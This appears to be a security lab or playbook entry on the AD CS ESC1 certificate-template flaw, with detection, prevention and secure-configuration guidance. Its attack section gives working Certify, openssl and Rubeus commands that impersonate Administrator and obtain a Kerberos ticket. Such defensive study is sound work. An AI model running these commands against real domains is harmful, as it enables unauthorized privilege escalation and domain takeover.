name: PKI ESC1 — Misconfigured Certificate Template (SAN Abuse)
description: ESC1: certificate templates that allow requesters to specify a Subject Alternative Name (SAN) and grant enrollment to low-privileged users. Attacker requests a certificate with SAN set to Administrator (or any privileged account), then uses Rubeus to get a TGT as that account. No password needed. Detection: Events 4886/4887 on CA server — examine template name and SAN in issued certificates. Log volume high, requires filtering.
notes:
=== BACKGROUND ===
  ESC1 conditions (all must be true):
    1. Certificate template allows 'Enrollee Supplies Subject' (SAN override)
    2. Template has 'Client Authentication' or 'Smart Card Logon' EKU
    3. Low-privileged users can enroll in the template
  
  Result: any domain user can request a certificate claiming to be ANY user
  Certificates are valid for Kerberos PKINIT → get TGT as Administrator

Lab template: UserCert on CA eagle-CA (PKI server at <PKI_IP>)

=== ATTACK ===
# Step 1: Enumerate vulnerable certificate templates
.\Certify.exe find /vulnerable
  → Look for:
    [!] Vulnerable Certificates Templates
    Template Name: <TEMPLATE>
    msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT
    pkiextendedkeyusage: Client Authentication
    Enrollment Rights: Domain Users (or any low-priv group)

# Step 2: Request a certificate as Administrator
.\Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:Administrator
  → /ca: Certification Authority full name (e.g., PKI.eagle.local\eagle-CA)
  → /template: the vulnerable template name (e.g., UserCert)
  → /altname: the user to impersonate in the SAN
  → Output: PEM-format certificate + private key saved to cert.pem

# Step 3: Fix line format in cert.pem (required!)
sed -i 's/\s\s\+/\n/g' cert.pem
  → Certify sometimes outputs cert + key on single line with extra spaces
  → This converts to proper PEM format

# Step 4: Convert PEM to PFX (PKCS#12) for Rubeus
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
  → Enter export password when prompted (can be blank, hit Enter)
  → -CSP flag ensures correct crypto provider for Windows Kerberos

# Step 5: Use certificate to get Kerberos TGT as Administrator
.\Rubeus.exe asktgt /domain:<DOMAIN> /user:Administrator /certificate:cert.pfx /dc:<DC_FQDN> /ptt
  → /certificate: path to the PFX file
  → /ptt: inject ticket immediately
  → If PFX has password: add /password:<password>

# Step 6: Verify and use ticket
klist
dir \\<DC_HOSTNAME>\c$

=== DETECTION ===
Event 4886: 'Certificate Services received a certificate request'
  → Logged on CA server
  → Contains: requester account, template name, SAN
  → Alert when: SAN != requester account name
  → Alert when: template allows SAN override + low-priv enrollment

Event 4887: 'Certificate Services approved a certificate request'
  → Issued certificate logged on CA
  → Contains same info as 4886 when auto-approved

Detection steps:
  → PSRemote to PKI server
  → Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4887} | Format-List
  → Correlate: requester != SAN subject = ESC1 abuse

Alternate: use certutil -view to list all issued certificates
certutil -view -restrict "RequesterName=<USERNAME>"

=== PREVENTION ===
  → Remove 'Enrollee Supplies Subject' flag from all templates unless required
  → Require Manager Approval for templates with SAN override
  → Restrict enrollment rights to only accounts that need the certificate
  → Run Certify.exe find /vulnerable regularly
  → Audit CA templates with: Get-ADObject -SearchBase '<CA_DN>' -Filter *

defense.why_it_works: An ESC1 certificate template lets the enrollee supply the Subject Alternative Name, carries a Client Authentication/Smart Card Logon EKU, and permits low-privileged enrollment. So any domain user can request a certificate claiming to be Administrator and use it for Kerberos PKINIT.
defense.prerequisites: A vulnerable template (Enrollee Supplies Subject + auth EKU + low-priv enrollment rights) and any domain user able to enroll.
defense.impact: A Kerberos TGT as any impersonated account (e.g., Administrator) with no password — a direct path to privileged access and, via the DC, domain compromise.
defense.detection: Event 4886 ('Certificate Services received a certificate request') and 4887 ('…approved…') on the CA. Alert when the SAN does not match the requester account, or when a template allowing SAN override + low-priv enrollment is used. certutil -view can list issued certificates for correlation.
defense.artifacts: 4886/4887 events on the CA where requester != SAN subject; Certify.exe request execution; a cert.pem/cert.pfx on the attacker host; Rubeus asktgt with /certificate.
defense.prevention: Remove the 'Enrollee Supplies Subject' flag from templates unless required; require Manager Approval on templates with SAN override; restrict enrollment rights to accounts that actually need the cert; run Certify find /vulnerable regularly.
defense.misconfiguration: An ADCS certificate template is misconfigured with ESC1 conditions: (1) 'Enrollee supplies subject' (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) is enabled, allowing the requester to specify any SAN (Subject Alternative Name) — including a Domain Admin UPN; (2) Low-privilege users (Domain Users, Authenticated Users) have Enroll or AutoEnroll rights on the template; (3) Client Authentication EKU is set. This lets any domain user request a certificate that authenticates as any other user.
defense.vulnerable_config:
# Certificate template properties (via Certify or ADCS MMC):
# Template: UserWebAuth
#   Subject Name: 'Supply in the request' (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 1)
#   EKU: Client Authentication (1.3.6.1.5.5.7.3.2)
#   Enrollment: Domain Users (Enroll)
# -> Any domain user can request a cert claiming UPN administrator@corp.local

# Certify scan:
# Certify.exe find /vulnerable
# [+] ESC1: UserWebAuth  -- 'Supply in request', Domain Users Enroll, Client Auth
defense.secure_config:
# Fix CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT:
# ADCS MMC -> Certificate Templates -> UserWebAuth -> Properties
# Subject Name tab -> change 'Supply in the request' to
#   'Build from this Active Directory information'

# Remove broad enrollment rights:
# Security tab -> remove 'Domain Users' -> add only the specific group that needs the cert

# Enable CA Manager Approval for sensitive templates:
# Issuance Requirements tab -> 'CA certificate manager approval' = checked
# This requires a human review before each certificate is issued

# Run Certify/PSPKIAudit quarterly to detect new vulnerable templates:
# Invoke-PKIAudit

# Enforce SID extension (Windows Server 2022+):
# Prevents certificate from authenticating as another user even with alt SAN
